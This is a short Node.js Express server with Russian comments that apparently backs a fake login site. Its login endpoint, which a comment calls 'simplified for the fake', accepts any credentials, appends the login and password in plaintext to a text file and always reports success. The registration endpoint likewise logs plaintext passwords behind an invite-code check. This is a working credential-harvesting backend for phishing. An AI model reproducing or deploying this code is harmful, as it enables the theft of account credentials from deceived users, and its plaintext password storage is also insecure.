const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных и инвайты
const DB_FILE = 'database.txt';
const INVITES_FILE = 'invites.json';

// Регистрация с проверкой инвайта
app.post('/api/register', (req, res) => {
    const { login, password, nickname, invite } = req.body;
    
    // Проверка инвайта
    const invites = JSON.parse(fs.readFileSync(INVITES_FILE, 'utf8'));
    if (!invites.includes(invite)) {
        return res.status(400).json({ error: "Invalid Invite Code!" });
    }

    const userData = `[REG] ${new Date().toLocaleString()} | Login: ${login} | Pass: ${password} | Nick: ${nickname} | Invite: ${invite}\n`;
    fs.appendFileSync(DB_FILE, userData);
    res.json({ success: true });
});

// Вход (упрощенный для фейка)
app.post('/api/login', (req, res) => {
    const { login, password } = req.body;
    const logData = `[LOGIN] ${new Date().toLocaleString()} | Login: ${login} | Pass: ${password}\n`;
    fs.appendFileSync(DB_FILE, logData);
    res.json({ success: true });
});

app.listen(3000, () => console.log('Server started on port 3000'));
